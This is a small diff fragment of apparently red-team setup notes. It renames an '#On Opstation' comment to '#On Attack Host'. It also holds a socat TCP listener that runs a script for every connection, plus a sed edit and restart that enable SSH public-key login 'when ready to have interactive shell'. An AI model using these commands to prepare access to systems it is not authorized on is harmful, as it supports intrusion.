@@ -6,7 +6,7 @@ EOF
 chmod +x info.sh
 socat -d -d TCP-LISTEN:<CHK_PORT>,fork,reuseaddr system:/path/to/info.sh
 
-#On Opstation
+#On Attack Host
 #When ready to have interactive shell
 sed -i "s/PubkeyAuthentication no #/PubkeyAuthentication yes #/" /etc/ssh/sshd_config
 systemctl restart ssh
